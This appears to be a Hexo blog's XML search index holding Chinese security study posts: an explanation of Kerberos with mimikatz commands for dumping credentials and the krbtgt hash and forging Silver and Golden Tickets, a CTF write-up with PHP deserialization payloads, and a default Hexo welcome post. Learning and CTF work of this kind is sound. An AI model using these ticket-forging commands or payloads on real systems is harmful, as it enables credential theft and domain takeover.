<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kerberos域认证流程---黄金票据和白银票据</title>
      <link href="/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
      <url>/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 AreUSerialz反序列化题目</title>
      <link href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
      <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%20AreUSerialz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>看了网鼎杯 AreUSerialz反序列化题目wp<br>对php的反序列化又有了学到了新的知识点，之前都没注意到</p><h2 id="标题题目是这样的："><a href="#标题题目是这样的：" class="headerlink" title="标题题目是这样的："></a>标题题目是这样的：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $op;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $filename;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line"></span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line"></span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line"></span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line"></span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下代码,反序列化漏洞<br>protect里面可控</p><p>主要是绕过 is_vaild 函数,它规定了序列化内容中只能包含ascii可见字符</p><p>还有因为在进行read()之前就会调用__destruct()魔术方法<br>__destruct()方法内使用了严格相等 this-&gt;op === “2” process()<br>方法内使用了else if ( this-&gt;op == “2”)<br>所以这里使用弱类型2 == “2”绕过 </p><h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>出题用的php版本比较高，public属性可以覆盖替代protected</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">"zeo"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"></span><br><span class="line">var_dump(is_valid($b));</span><br><span class="line">print_r($b);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511210523671.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200511210452672.png" alt="在这里插入图片描述"></p><h2 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h2><p>下面P牛之前的解释</p><p>PHP序列化的时候private和protected变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，如图1，url编码后就可以看得很清楚了。<br>同理，protected属性会引入\x00*\x00。</p><p>此时，为了更加方便进行反序列化Payload的传输与显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。比如s:5:”A<null_byte>B<cr><lf>“;̀ -&gt; S:5:”A\00B\09\0D”;</p><p>把序列号后的s变成S就可以了，里面的字符就可以正常</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;S:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;S:<span class="number">6</span>:<span class="string">"loecho"</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/05/08/hello-world/"/>
      <url>/2020/05/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight 